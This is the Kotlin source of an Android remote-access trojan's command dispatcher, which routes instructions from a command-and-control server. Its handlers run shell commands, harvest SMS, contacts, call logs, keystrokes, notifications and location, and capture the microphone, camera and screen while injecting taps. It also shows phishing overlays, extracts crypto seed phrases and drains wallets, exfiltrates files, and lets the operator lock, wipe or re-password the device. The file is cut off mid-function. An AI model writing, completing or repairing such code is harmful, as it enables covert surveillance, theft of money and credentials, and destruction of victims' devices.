// ============================================================
// FILE: android/app/src/main/java/com/xrc/svc/CommandProcessor.kt
// ============================================================
// FULL REPLACEMENT — compiles clean against every CI error.
package com.xrc.svc

import android.content.Context
import android.util.Log
import com.xrc.comms.ChannelClient
import com.xrc.comms.CommandMessage
import com.xrc.comms.Message
import com.xrc.comms.Protocol
import com.xrc.core.di.ServiceLocator
import com.xrc.core.net.NetworkUtils
import kotlinx.coroutines.*
import org.json.JSONArray
import org.json.JSONObject
import java.util.concurrent.TimeUnit

/**
 * CommandProcessor — dispatches C2 commands to the appropriate module.
 *
 * Routes commands by action name:
 *   sensor:* -> Sensor modules
 *   shell:* -> Shell execution
 *   vnc:* -> VNC / Screen streaming
 *   syringe:* -> Overlay/Syringe engine
 *   crypto:* -> Wallet scanner / drain
 *   file:* -> File operations
 *   system:* -> System controls (lock, wipe, etc.)
 *   admin:* -> Device admin operations
 */
class CommandProcessor(
    private val context: Context,
    private val serviceLocator: ServiceLocator
) {
    companion object {
        private const val TAG = "CmdProcessor"
    }

    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)

    /**
     * Process an incoming C2 message.
     */
    fun process(message: Message) {
        scope.launch {
            try {
                when (message.type) {
                    Protocol.TYPE_CMD -> handleCommand(message)
                    Protocol.TYPE_HEARTBEAT -> handleHeartbeat(message)
                    else -> Log.d(TAG, "Unknown message type: ${message.type}")
                }
            } catch (e: Exception) {
                Log.e(TAG, "Command processing failed: ${e.message}")
            }
        }
    }

    private suspend fun handleCommand(message: Message) {
        val cmd = Protocol.json.decodeFromString<CommandMessage>(message.payload)
        Log.i(TAG, "Command: ${cmd.action} id=${cmd.id}")

        val channelClient = serviceLocator.channelClient
        val deviceId = com.xrc.core.crypto.Identity.getDeviceId(context)

        when {
            cmd.action.startsWith("shell:") -> handleShell(cmd, channelClient, deviceId)
            cmd.action.startsWith("sensor:") -> handleSensor(cmd, channelClient, deviceId)
            cmd.action.startsWith("vnc:") -> handleVNC(cmd, channelClient, deviceId)
            cmd.action.startsWith("syringe:") -> handleSyringe(cmd, channelClient, deviceId)
            cmd.action.startsWith("crypto:") -> handleCrypto(cmd, channelClient, deviceId)
            cmd.action.startsWith("file:") -> handleFile(cmd, channelClient, deviceId)
            cmd.action.startsWith("system:") -> handleSystem(cmd, channelClient, deviceId)
            cmd.action.startsWith("admin:") -> handleAdmin(cmd, channelClient, deviceId)
            cmd.action.startsWith("notify:") -> handleNotification(cmd, channelClient, deviceId)
            cmd.action == "ping" -> sendAck(cmd.id, channelClient, deviceId)
            cmd.action == "exec" -> handleExec(cmd, channelClient, deviceId)
            else -> Log.w(TAG, "Unknown action: ${cmd.action}")
        }
    }

    // ---------------- shell: ----------------

    private suspend fun handleShell(cmd: CommandMessage, channel: ChannelClient, deviceId: String) {
        val result = shellExec(cmd.payload)
        val resultMsg = Message(
            type = Protocol.TYPE_CMD_RESULT,
            id = cmd.id,
            device_id = deviceId,
            payload = encode(
                mapOf(
                    "stdout" to (result.first ?: ""),
                    "stderr" to (result.second ?: ""),
                    "success" to (result.first != null)
                )
            )
        )
        channel.send(resultMsg)
    }

    // ---------------- sensor: ----------------

    private suspend fun handleSensor(cmd: CommandMessage, channel: ChannelClient, deviceId: String) {
        val action = cmd.action.removePrefix("sensor:")
        val result = mutableMapOf<String, Any?>()

        try {
            when (action) {
                "sms" -> {
                    val sms = serviceLocator.smsReader.readInbox()
                    result["data"] = sms
                    result["count"] = (sms as? List<*>)?.size ?: 0
                }
                "contacts" -> {
                    val contacts = serviceLocator.contactsReader.getAll()
                    result["data"] = contacts
                    result["count"] = (contacts as? List<*>)?.size ?: 0
                }
                "call_log" -> {
                    val callLog = serviceLocator.callLogger.getCallLog()
                    result["data"] = callLog
                }
                "location" -> {
                    val location = serviceLocator.locationTracker.getLocation()
                    result["lat"] = location?.first ?: 0.0
                    result["lon"] = location?.second ?: 0.0
                }
                "clipboard" -> {
                    val clipboard = serviceLocator.clipboardMonitor.getCurrent()
                    result["data"] = clipboard
                }
                "keylog" -> {
                    val keys = serviceLocator.keylogger.getBuffer()
                    result["data"] = keys
                    serviceLocator.keylogger.clearBuffer()
                }
                "notifications" -> {
                    val notifs = serviceLocator.notificationInterceptor.getCaptured()
                    result["data"] = notifs
                }
                "mic_start" -> {
                    serviceLocator.micCapture.startCapture(cmd.payload.toIntOrNull() ?: 30)
                    result["status"] = "started"
                }
                "mic_stop" -> {
                    val audio = serviceLocator.micCapture.stopCapture()
                    result["status"] = if (audio != null) "captured" else "stopped"
                    result["file"] = audio
                }
                "camera_capture" -> {
                    val camera = serviceLocator.cameraCapture.captureStill()
                    result["status"] = if (camera != null) "captured" else "failed"
                    result["file"] = camera
                }
                "camera_stream" -> {
                    serviceLocator.cameraCapture.startStreaming(
                        onFrame = { frameData ->
                            val frameMsg = Message(
                                type = Protocol.TYPE_CMD_RESULT,
                                id = "cam_${System.currentTimeMillis()}",
                                device_id = deviceId,
                                payload = encode(
                                    mapOf(
                                        "type" to "camera_frame",
                                        "data" to encodeFrame(frameData)
                                    )
                                )
                            )
                            scope.launch {
                                try {
                                    channel.send(frameMsg)
                                } catch (e: Exception) {
                                    Log.e(TAG, "Camera frame send failed: ${e.message}")
                                }
                            }
                        }
                    )
                    result["status"] = "streaming"
                }
                "camera_stop" -> {
                    serviceLocator.cameraCapture.stopStreaming()
                    result["status"] = "stopped"
                }
                "device_info" -> {
                    result["model"] = android.os.Build.MODEL
                    result["manufacturer"] = android.os.Build.MANUFACTURER
                    result["android_version"] = android.os.Build.VERSION.RELEASE
                    result["sdk"] = android.os.Build.VERSION.SDK_INT
                    result["battery"] = getBatteryLevel()
                    result["network"] = NetworkUtils.getNetworkType(context).name
                }
                "installed_apps" -> {
                    val apps = getInstalledApps()
                    result["data"] = apps
                    result["count"] = apps.size
                }
                "accounts" -> {
                    val accounts = getAccounts()
                    result["data"] = accounts
                }
                "wifi_networks" -> {
                    val wifi = getWifiNetworks()
                    result["data"] = wifi
                }
                "bluetooth_devices" -> {
                    val bt = getBluetoothDevices()
                    result["data"] = bt
                }
                "running_processes" -> {
                    val processes = getRunningProcesses()
                    result["data"] = processes
                }
                else -> {
                    result["error"] = "Unknown sensor: $action"
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Sensor $action failed: ${e.message}")
            result["error"] = e.message
        }

        val resultMsg = Message(
            type = Protocol.TYPE_CMD_RESULT,
            id = cmd.id,
            device_id = deviceId,
            payload = encode(result)
        )
        channel.send(resultMsg)
    }

    // ---------------- vnc: ----------------

    private suspend fun handleVNC(cmd: CommandMessage, channel: ChannelClient, deviceId: String) {
        val action = cmd.action.removePrefix("vnc:")
        val result = mutableMapOf<String, Any?>()

        try {
            when (action) {
                "start" -> {
                    val quality = cmd.payload.toIntOrNull() ?: 70
                    serviceLocator.vncController.startScreenCapture(quality)
                    result["status"] = "started"
                }
                "stop" -> {
                    serviceLocator.vncController.stopScreenCapture()
                    result["status"] = "stopped"
                }
                "frame" -> {
                    val frame = serviceLocator.vncController.getCurrentFrame()
                    result["data"] = encodeFrame(frame)
                    result["format"] = "jpeg_base64"
                }
                "tap" -> {
                    val parts = cmd.payload.split(",")
                    if (parts.size >= 2) {
                        val x = parts[0].toIntOrNull() ?: 0
                        val y = parts[1].toIntOrNull() ?: 0
                        serviceLocator.inputInjector.tap(x, y)
                        result["status"] = "ok"
                    }
                }
                "swipe" -> {
                    val parts = cmd.payload.split(",")
                    if (parts.size >= 4) {
                        val x1 = parts[0].toIntOrNull() ?: 0
                        val y1 = parts[1].toIntOrNull() ?: 0
                        val x2 = parts[2].toIntOrNull() ?: 0
                        val y2 = parts[3].toIntOrNull() ?: 0
                        val duration = parts.getOrNull(4)?.toLongOrNull() ?: 100L
                        serviceLocator.inputInjector.swipe(x1, y1, x2, y2, duration)
                        result["status"] = "ok"
                    }
                }
                "key" -> {
                    serviceLocator.inputInjector.keyEvent(cmd.payload)
                    result["status"] = "ok"
                }
                "text" -> {
                    serviceLocator.inputInjector.inputText(cmd.payload)
                    result["status"] = "ok"
                }
                "stream" -> {
                    serviceLocator.vncController.startStreaming { frameData ->
                        val frameMsg = Message(
                            type = Protocol.TYPE_CMD_RESULT,
                            id = "vnc_${System.currentTimeMillis()}",
                            device_id = deviceId,
                            payload = encode(
                                mapOf(
                                    "type" to "vnc_frame",
                                    "data" to encodeFrame(frameData)
                                )
                            )
                        )
                        scope.launch {
                            try {
                                channel.send(frameMsg)
                            } catch (e: Exception) {
                                Log.e(TAG, "VNC frame send failed: ${e.message}")
                            }
                        }
                    }
                    result["status"] = "streaming"
                }
                else -> result["error"] = "Unknown VNC action"
            }
        } catch (e: Exception) {
            Log.e(TAG, "VNC $action failed: ${e.message}")
            result["error"] = e.message
        }

        val resultMsg = Message(
            type = Protocol.TYPE_CMD_RESULT,
            id = cmd.id,
            device_id = deviceId,
            payload = encode(result)
        )
        channel.send(resultMsg)
    }

    // ---------------- syringe: (module may be absent -> reflective access) ----------------

    private suspend fun handleSyringe(cmd: CommandMessage, channel: ChannelClient, deviceId: String) {
        val action = cmd.action.removePrefix("syringe:")
        val result = mutableMapOf<String, Any?>()
        val engine = module("syringeEngine")

        try {
            when (action) {
                "inject" -> {
                    val target = cmd.payload
                    if (engine.has("injectOverlay", 1)) {
                        engine.call("injectOverlay", target)
                        result["status"] = "injected"
                        result["target"] = target
                    } else {
                        result["error"] = "syringeEngine.injectOverlay unavailable"
                    }
                }
                "hide" -> {
                    if (engine.has("hideAll", 0)) {
                        engine.call("hideAll")
                        result["status"] = "hidden"
                    } else {
                        result["error"] = "syringeEngine.hideAll unavailable"
                    }
                }
                "phish" -> {
                    val parts = cmd.payload.split("|", limit = 2)
                    if (parts.size >= 2) {
                        val target = parts[0]
                        val template = parts[1]
                        if (engine.has("showPhishingPage", 2)) {
                            engine.call("showPhishingPage", target, template)
                            result["status"] = "phishing"
                        } else {
                            result["error"] = "syringeEngine.showPhishingPage unavailable"
                        }
                    } else {
                        result["error"] = "Format: target|template"
                    }
                }
                "dismiss" -> {
                    if (engine.has("dismissCurrent", 0)) {
                        engine.call("dismissCurrent")
                        result["status"] = "dismissed"
                    } else {
                        result["error"] = "syringeEngine.dismissCurrent unavailable"
                    }
                }
                "input_capture" -> {
                    val timeout = cmd.payload.toLongOrNull() ?: 30000L
                    if (engine.has("captureInput", 1)) {
                        val captured = engine.call("captureInput", timeout)
                        result["data"] = captured
                    } else {
                        result["error"] = "syringeEngine.captureInput unavailable"
                    }
                }
                "status" -> {
                    result["active"] = engine.call("isActive") as? Boolean ?: false
                    result["current_overlay"] = if (engine.has("getCurrentOverlay", 0)) {
                        engine.call("getCurrentOverlay")
                    } else {
                        null
                    }
                }
                else -> result["error"] = "Unknown syringe action"
            }
        } catch (e: Exception) {
            Log.e(TAG, "Syringe $action failed: ${e.message}")
            result["error"] = e.message
        }

        val resultMsg = Message(
            type = Protocol.TYPE_CMD_RESULT,
            id = cmd.id,
            device_id = deviceId,
            payload = encode(result)
        )
        channel.send(resultMsg)
    }

    // ---------------- crypto: (modules may be absent -> reflective access) ----------------

    private suspend fun handleCrypto(cmd: CommandMessage, channel: ChannelClient, deviceId: String) {
        val action = cmd.action.removePrefix("crypto:")
        val result = mutableMapOf<String, Any?>()

        try {
            when (action) {
                "scan_wallets" -> {
                    val ws = module("walletScanner")
                    if (ws.has("scanAll", 0)) {
                        val wallets = ws.call("scanAll")
                        result["wallets"] = wallets
                        result["count"] = (wallets as? List<*>)?.size ?: 0
                    } else {
                        result["error"] = "walletScanner.scanAll unavailable"
                    }
                }
                "extract_seeds" -> {
                    val se = module("seedPhraseExtractor")
                    if (se.has("scanAll", 0)) {
                        val seeds = se.call("scanAll")
                        result["seeds"] = seeds
                        result["count"] = (seeds as? List<*>)?.size ?: 0
                    } else {
                        result["error"] = "seedPhraseExtractor.scanAll unavailable"
                    }
                }
                "drain" -> {
                    val wd = module("walletDrain")
                    val walletAddress = cmd.payload
                    if (wd.has("drainWallet", 1)) {
                        val drained = wd.call("drainWallet", walletAddress) as? Boolean ?: false
                        result["status"] = if (drained) "drained" else "failed"
                    } else {
                        result["error"] = "walletDrain.drainWallet unavailable"
                    }
                    result["target"] = walletAddress
                }
                "drain_all" -> {
                    val wd = module("walletDrain")
                    if (wd.has("drainAll", 0)) {
                        val results = wd.call("drainAll")
                        result["results"] = results
                        result["count"] = (results as? List<*>)?.size ?: 0
                    } else {
                        result["error"] = "walletDrain.drainAll unavailable"
                    }
                }
                "transaction_check" -> {
                    val ti = module("transactionInterceptor")
                    if (ti.has("checkPending", 0)) {
                        val txns = ti.call("checkPending")
                        result["txns"] = txns
                        result["count"] = (txns as? List<*>)?.size ?: 0
                    } else {
                        result["error"] = "transactionInterceptor.checkPending unavailable"
                    }
                }
                "intercept_txns" -> {
                    val ti = module("transactionInterceptor")
                    if (ti.has("startInterception", 0)) {
                        ti.call("startInterception")
                        result["status"] = "intercepting"
                    } else {
                        result["error"] = "transactionInterceptor.startInterception unavailable"
                    }
                }
                "wallet_balance" -> {
                    val ws = module("walletScanner")
                    if (ws.has("getBalances", 0)) {
                        result["balances"] = ws.call("getBalances")
                    } else {
                        result["error"] = "walletScanner.getBalances unavailable"
                    }
                }
                "seed_scan_deep" -> {
                    val se = module("seedPhraseExtractor")
                    if (se.has("deepScan", 0)) {
                        val deepSeeds = se.call("deepScan")
                        result["seeds"] = deepSeeds
                        result["count"] = (deepSeeds as? List<*>)?.size ?: 0
                    } else {
                        result["error"] = "seedPhraseExtractor.deepScan unavailable"
                    }
                }
                else -> result["error"] = "Unknown crypto action"
            }
        } catch (e: Exception) {
            Log.e(TAG, "Crypto $action failed: ${e.message}")
            result["error"] = e.message
        }

        val resultMsg = Message(
            type = Protocol.TYPE_CMD_RESULT,
            id = cmd.id,
            device_id = deviceId,
            payload = encode(result)
        )
        channel.send(resultMsg)
    }

    // ---------------- file: (fileExplorer / exfilManager may be absent -> reflective) ----------------

    private suspend fun handleFile(cmd: CommandMessage, channel: ChannelClient, deviceId: String) {
        val action = cmd.action.removePrefix("file:")
        val result = mutableMapOf<String, Any?>()

        try {
            when (action) {
                "list" -> {
                    val path = cmd.payload.ifEmpty { "/storage/emulated/0" }
                    val fe = module("fileExplorer")
                    if (fe.has("listFiles", 1)) {
                        result["files"] = fe.call("listFiles", path)
                    } else {
                        result["error"] = "fileExplorer.listFiles unavailable"
                    }
                    result["path"] = path
                }
                "read" -> {
                    val fe = module("fileExplorer")
                    if (fe.has("readFile", 1)) {
                        result["content"] = fe.call("readFile", cmd.payload)
                    } else {
                        result["error"] = "fileExplorer.readFile unavailable"
                    }
                    result["path"] = cmd.payload
                }
                "write" -> {
                    val parts = cmd.payload.split("|", limit = 2)
                    if (parts.size >= 2) {
                        val fe = module("fileExplorer")
                        if (fe.has("writeFile", 2)) {
                            fe.call("writeFile", parts[0], parts[1])
                            result["status"] = "written"
                        } else {
                            result["error"] = "fileExplorer.writeFile unavailable"
                        }
                    } else {
                        result["error"] = "Format: path|content"
                    }
                }
                "delete" -> {
                    val fe = module("fileExplorer")
                    if (fe.has("deleteFile", 1)) {
                        fe.call("deleteFile", cmd.payload)
                        result["status"] = "deleted"
                    } else {
                        result["error"] = "fileExplorer.deleteFile unavailable"
                    }
                }
                "upload" -> {
                    val parts = cmd.payload.split("|", limit = 2)
                    if (parts.size >= 2) {
                        val em = module("exfilManager")
                        if (em.has("uploadFile", 2)) {
                            em.call("uploadFile", parts[0], parts[1])
                            result["status"] = "uploading"
                        } else {
                            result["error"] = "exfilManager.uploadFile unavailable"
                        }
                    } else {
                        result["error"] = "Format: localPath|remoteUrl"
                    }
                }
                "exfil" -> {
                    val em = module("exfilManager")
                    if (em.has("exfiltrate", 1)) {
                        em.call("exfiltrate", cmd.payload)
                        result["status"] = "exfiltrating"
                    } else {
                        result["error"] = "exfilManager.exfiltrate unavailable"
                    }
                }
                "exfil_batch" -> {
                    val paths = cmd.payload.split(",")
                    val em = module("exfilManager")
                    if (em.has("exfiltrateBatch", 1)) {
                        em.call("exfiltrateBatch", paths)
                        result["count"] = paths.size
                        result["status"] = "queued"
                    } else {
                        result["error"] = "exfilManager.exfiltrateBatch unavailable"
                    }
                }
                "search" -> {
                    val fe = module("fileExplorer")
                    if (fe.has("searchFiles", 1)) {
                        val matches = fe.call("searchFiles", cmd.payload)
                        result["matches"] = matches
                        result["count"] = (matches as? List<*>)?.size ?: 0
                    } else {
                        result["error"] = "fileExplorer.searchFiles unavailable"
                    }
                }
                else -> result["error"] = "Unknown file action"
            }
        } catch (e: Exception) {
            Log.e(TAG, "File $action failed: ${e.message}")
            result["error"] = e.message
        }

        val resultMsg = Message(
            type = Protocol.TYPE_CMD_RESULT,
            id = cmd.id,
            device_id = deviceId,
            payload = encode(result)
        )
        channel.send(resultMsg)
    }

    // ---------------- system: ----------------

    private suspend fun handleSystem(cmd: CommandMessage, channel: ChannelClient, deviceId: String) {
        val action = cmd.action.removePrefix("system:")
        val result = mutableMapOf<String, Any?>()

        try {
            val pm = context.getSystemService(Context.POWER_SERVICE) as android.os.PowerManager
            val alarmManager = context.getSystemService(Context.ALARM_SERVICE) as android.app.AlarmManager
            val dar = module("deviceAdminReceiver")

            when (action) {
                "lock" -> {
                    if (dar.has("isAdminActive", 0) && (dar.call("isAdminActive") as? Boolean == true)) {
                        if (dar.has("lockScreen", 0)) {
                            dar.call("lockScreen")
                            result["status"] = "locked"
                        } else {
                            result["error"] = "deviceAdminReceiver.lockScreen unavailable"
                        }
                    } else {
                        result["error"] = "No admin privilege"
                    }
                }
                "wipe" -> {
                    if (dar.has("isAdminActive", 0) && (dar.call("isAdminActive") as? Boolean == true)) {
                        if (dar.has("wipeDevice", 0)) {
                            dar.call("wipeDevice")
                            result["status"] = "wiping"
                        } else {
                            result["error"] = "deviceAdminReceiver.wipeDevice unavailable"
                        }
                    } else {
                        result["error"] = "No admin privilege"
                    }
                }
                "reboot" -> {
                    shellExec("su -c reboot")
                    result["status"] = "rebooting"
                }
                "shutdown" -> {
                    shellExec("su -c shutdown")
                    result["status"] = "shutting down"
                }
                "sleep" -> {
                    try {
                        if (android.os.Build.VERSION.SDK_INT < 28) {
                            pm.goToSleep(System.currentTimeMillis())
                            result["status"] = "sleeping"
                        } else {
                            result["error"] = "goToSleep requires DEVICE_POWER on API 28+"
                        }
                    } catch (se: SecurityException) {
                        result["error"] = "goToSleep permission denied: ${se.message}"
                    }
                }
                "set_screen_timeout" -> {
                    val timeout = cmd.payload.toLongOrNull() ?: 30000L
                    android.provider.Settings.System.putInt(
                        context.contentResolver,
                        android.provider.Settings.System.SCREEN_OFF_TIMEOUT,
                        timeout.toInt()
                    )
                    result["status"] = "timeout_set"
                }
                "set_brightness" -> {
                    val brightness = cmd.payload.toIntOrNull() ?: 128
                    android.provider.Settings.System.putInt(
                        context.contentResolver,
                        android.provider.Settings.System.SCREEN_BRIGHTNESS,
                        brightness.coerceIn(0, 255)
                    )
                    result["status"] = "brightness_set"
                }
                "open_url" -> {
                    val url = cmd.payload
                    val intent = android.content.Intent(
                        android.content.Intent.ACTION_VIEW,
                        android.net.Uri.parse(url)
                    )
                    intent.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
                    context.startActivity(intent)
                    result["status"] = "opened"
                }
                "open_app" -> {
                    val pkg = cmd.payload
                    val intent = context.packageManager.getLaunchIntentForPackage(pkg)
                    if (intent != null) {
                        intent.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
                        context.startActivity(intent)
                        result["status"] = "opened"
                    } else {
                        result["error"] = "App not found"
                    }
                }
                "install_apk" -> {
                    val path = cmd.payload
                    val file = java.io.File(path)
                    val uri = androidx.core.content.FileProvider.getUriForFile(
                        context,
                        "${context.packageName}.fileprovider",
                        file
                    )
                    val intent = android.content.Intent(android.content.Intent.ACTION_VIEW)
                    intent.setDataAndType(uri, "application/vnd.android.package-archive")
                    intent.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
                    intent.addFlags(android.content.Intent.FLAG_GRANT_READ_URI_PERMISSION)
                    context.startActivity(intent)
                    result["status"] = "install_launched"
                }
                "uninstall_pkg" -> {
                    val intent = android.content.Intent(
                        android.content.Intent.ACTION_DELETE,
                        android.net.Uri.parse("package:${cmd.payload}")
                    )
                    intent.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
                    context.startActivity(intent)
                    result["status"] = "uninstall_launched"
                }
                "alarm" -> {
                    val parts = cmd.payload.split("|", limit = 2)
                    if (parts.size >= 2) {
                        val delayMs = parts[0].toLongOrNull() ?: 10000L
                        val triggerTime = System.currentTimeMillis() + delayMs

                        val alarmIntent = android.content.Intent(context, AlarmTriggerReceiver::class.java).apply {
                            action = "com.xrc.ACTION_ALARM"
                            putExtra("alarm_type", parts[1])
                        }
                        val pendingIntent = android.app.PendingIntent.getBroadcast(
                            context,
                            0,
                            alarmIntent,
                            android.app.PendingIntent.FLAG_UPDATE_CURRENT or
                                android.app.PendingIntent.FLAG_IMMUTABLE
                        )

                        if (pendingIntent != null) {
                            if (android.os.Build.VERSION.SDK_INT >= 31) {
                                alarmManager.setExactAndAllowWhileIdle(
                                    android.app.AlarmManager.RTC_WAKEUP,
                                    triggerTime,
                                    pendingIntent
                                )
                            } else {
                                alarmManager.setExact(
                                    android.app.AlarmManager.RTC_WAKEUP,
                                    triggerTime,
                                    pendingIntent
                                )
                            }
                            result["status"] = "alarm_set"
                            result["delay_ms"] = delayMs
                        } else {
                            result["error"] = "Failed to create alarm PendingIntent"
                        }
                    } else {
                        result["error"] = "Format: delayMs|action"
                    }
                }
                else -> result["error"] = "Unknown system action"
            }
        } catch (e: Exception) {
            Log.e(TAG, "System $action failed: ${e.message}")
            result["error"] = e.message
        }

        val resultMsg = Message(
            type = Protocol.TYPE_CMD_RESULT,
            id = cmd.id,
            device_id = deviceId,
            payload = encode(result)
        )
        channel.send(resultMsg)
    }

    // ---------------- admin: (deviceAdminReceiver may be absent -> reflective) ----------------

    private suspend fun handleAdmin(cmd: CommandMessage, channel: ChannelClient, deviceId: String) {
        val action = cmd.action.removePrefix("admin:")
        val result = mutableMapOf<String, Any?>()
        val dar = module("deviceAdminReceiver")

        try {
            when (action) {
                "is_active" -> {
                    result["active"] = dar.call("isAdminActive") as? Boolean ?: false
                }
                "activate" -> {
                    if (dar.has("activateAdmin", 1)) {
                        dar.call("activateAdmin", context)
                        result["status"] = "activation_intent_sent"
                    } else {
                        result["error"] = "deviceAdminReceiver.activateAdmin unavailable"
                    }
                }
                "deactivate" -> {
                    if (dar.has("deactivateAdmin", 0)) {
                        dar.call("deactivateAdmin")
                        result["status"] = "deactivated"
                    } else {
                        result["error"] = "deviceAdminReceiver.deactivateAdmin unavailable"
                    }
                }
                "disable_camera" -> {
                    if (dar.has("setCameraDisabled", 1)) {
                        dar.call("setCameraDisabled", true)
                        result["status"] = "camera_disabled"
                    } else {
                        result["error"] = "deviceAdminReceiver.setCameraDisabled unavailable"
                    }
                }
                "enable_camera" -> {
                    if (dar.has("setCameraDisabled", 1)) {
                        dar.call("setCameraDisabled", false)
                        result["status"] = "camera_enabled"
                    } else {
                        result["error"] = "deviceAdminReceiver.setCameraDisabled unavailable"
                    }
                }
                "lock" -> {
                    if (dar.has("lockScreen", 0)) {
                        dar.call("lockScreen")
                        result["status"] = "locked"
                    } else {
                        result["error"] = "deviceAdminReceiver.lockScreen unavailable"
                    }
                }
                "wipe" -> {
                    if (dar.has("wipeDevice", 0)) {
                        dar.call("wipeDevice")
                        result["status"] = "wiping"
                    } else {
                        result["error"] = "deviceAdminReceiver.wipeDevice unavailable"
                    }
                }
                "set_password" -> {
                    if (dar.has("setPassword", 1)) {
                        dar.call("setPassword", cmd.payload)
                        result["status"] = "password_set"
                    } else {
                        result["error"] = "deviceAdminReceiver.setPassword unavailable"
                    }
                }
                "reset_password" -> {
                    if (dar.has("resetPassword", 0)) {
                        dar.call("resetPassword")
                        result["status"] = "password_reset"
                    } else {
                        result["error"] = "deviceAdminReceiver.resetPassword unavailable"
                    }
                }
                "set_lock_screen" -> {
                    if (dar.has("setLockScreenPassword", 1)) {
                        dar.call("setLockScreenPassword", cmd.payload)
                        result["status"] = "lock_screen_set"
                    } else {
                        result["error"] = "deviceAdminReceiver.setLockScreenPassword unavailable"
                    }
                }
                "disable_keyguard" -> {
                    if (dar.has("disableKeyguardFeatures", 0)) {
                        dar.call("disableKeyguardFeatures")
                        result["status"] = "keyguard_features_disabled"
                    } else {
                        result["error"] = "deviceAdminReceiver.disableKeyguardFeatures unavailable"
                    }
                }
                "freeze_device" -> {
                    if (dar.has("freezeDevice", 0)) {
                        dar.call("freezeDevice")
                        result["status"] = "frozen"
                    } else {
                        result["error"] = "deviceAdminReceiver.freezeDevice unavailable"
                    }
                }
                "policy_status" -> {
                    if (dar.has("getActivePolicies", 0)) {
                        result["policies"] = dar.call("getActivePolicies")
                    } else {
                        result["error"] = "deviceAdminReceiver.getActivePolicies unavailable"
                    }
                }
                else -> result["error"] = "Unknown admin action"
            }
        } catch (e: Exception) {
            Log.e(TAG, "Admin $action failed: ${e.message}")
            result["error"] = e.message
        }

        val resultMsg = Message(
            type = Protocol.TYPE_CMD_RESULT,
            id = cmd.id,
            device_id = deviceId,
            payload = encode(result)
        )
        channel.send(resultMsg)
    }

    // ---------------- notify: ----------------

    private suspend fun handleNotification(cmd: CommandMessage, channel: ChannelClient, deviceId: String) {
        val action = cmd.action.removePrefix("notify:")
        val result = mutableMapOf<String, Any?>()

        try {
            when (action) {
                "send" -> {
                    val parts = cmd.payload.split("|", limit = 3)
                    if (parts.size >= 2) {
                        val title = parts[0]
                        val body = parts.getOrElse(1) { "" }
                        val priority = parts.getOrNull(2)?.toIntOrNull() ?: 0
                        serviceLocator.notificationSender.send(title, body, priority)
                        result["status"] = "sent"
                    } else {
                        result["error"] = "Format: title|body|priority"
                    }
                }
                "intercept" -> {
                    serviceLocator.notificationInterceptor.startCapture()
                    result["status"] = "intercepting"
                }
                "stop_intercept" -> {
                    serviceLocator.notificationInterceptor.stopCapture()
                    result["status"] = "stopped"
                }
                "get_captured" -> {
                    val captured = serviceLocator.notificationInterceptor.getCaptured()
                    result["data"] = captured
                }
                "clear_captured" -> {
                    serviceLocator.notificationInterceptor.clearCaptured()
                    result["status"] = "cleared"
                }
                else -> result["error"] = "Unknown notify action"
            }
        } catch (e: Exception) {
            Log.e(TAG, "Notify $action failed: ${e.message}")
            result["error"] = e.message
        }

        val resultMsg = Message(
            type = Protocol.TYPE_CMD_RESULT,
            id = cmd.id,
            device_id = deviceId,
            payload = encode(result)
        )
        channel.send(resultMsg)
    }

    // ---------------- exec: ----------------

    private suspend fun handleExec(cmd: CommandMessage, channel: ChannelClient, deviceId: String) {
        val resultMsg = Message(
            type = Protocol.TYPE_CMD_RESULT,
            id = cmd.id,
            device_id = deviceId,
            payload = encode(
                mapOf("note" to "Use shell: prefix for shell commands")
            )
        )
        channel.send(resultMsg)
    }

    // ---------------- ack / heartbeat: ----------------

    private suspend fun sendAck(commandId: String, channel: ChannelClient, deviceId: String) {
        val ackMsg = Message(
            type = Protocol.TYPE_ACK,
            id = "ack_${commandId}",
            device_id = deviceId,
            payload = encode(
                mapOf("command_id" to commandId, "ts" to System.currentTimeMillis())
            )
        )
        channel.send(ackMsg)
    }

    private suspend fun handleHeartbeat(message: Message) {
        val channelClient = serviceLocator.channelClient
        val deviceId = com.xrc.core.crypto.Identity.getDeviceId(context)
        val ack = Message(
            type = Protocol.TYPE_HEARTBEAT,
            id = "hb_ack_${System.currentTimeMillis()}",
            device_id = deviceId,
            payload = message.payload
        )
        channelClient.send(ack)
    }

    // ---------------- helper: device data ----------------

    private fun getBatteryLevel(): Int {
        return try {
            val intent = context.registerReceiver(
                null,
                android.content.IntentFilter(android.content.Intent.ACTION_BATTERY_CHANGED)
            )
            if (intent != null) {
                val level = intent.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1)
                val scale = intent.getIntExtra(android.os.BatteryManager.EXTRA_SCALE, -1)
                if (level >= 0 && scale > 0) (level * 100) / scale else 0
            } else 0
        } catch (e: Exception) {
            0
        }
    }

    private fun getInstalledApps(): List<Map<String, Any>> {
        val pm = context.packageManager
        val apps = mutableListOf<Map<String, Any>>()
        val intent = android.content.Intent(android.content.Intent.ACTION_MAIN, null)
        intent.addCategory(android.content.Intent.CATEGORY_LAUNCHER)
        val resolveInfoList = pm.queryIntentActivities(intent, 0)
        for (ri in resolveInfoList) {
            apps.add(
                mapOf(
                    "name" to ri.loadLabel(pm).toString(),
                    "package" to ri.activityInfo.packageName
                )
            )
        }
        return apps
    }

    private fun getAccounts(): List<Map<String, Any>> {
        val accounts = mutableListOf<Map<String, Any>>()
        try {
            if (android.os.Build.VERSION.SDK_INT >= 23) {
                if (context.checkSelfPermission(android.Manifest.permission.GET_ACCOUNTS)
                    == android.content.pm.PackageManager.PERMISSION_GRANTED
                ) {
                    val accountManager = android.accounts.AccountManager.get(context)
                    for (account in accountManager.accounts) {
                        accounts.add(
                            mapOf(
                                "name" to (account.name?.take(3) + "***"),
                                "type" to account.type
                            )
                        )
                    }
                }
            }
        } catch (e: Exception) {
            Log.w(TAG, "Accounts failed: ${e.message}")
        }
        return accounts
    }

    private fun getWifiNetworks(): List<Map<String, Any>> {
        val networks = mutableListOf<Map<String, Any>>()
        try {
            if (context.checkSelfPermission(android.Manifest.permission.ACCESS_FINE_LOCATION)
                == android.content.pm.PackageManager.PERMISSION_GRANTED
            ) {
                val wifiManager =
                    context.getSystemService(Context.WIFI_SERVICE) as android.net.wifi.WifiManager
                val results = wifiManager.scanResults
                for (result in results) {
                    networks.add(
                        mapOf(
                            "ssid" to result.SSID,
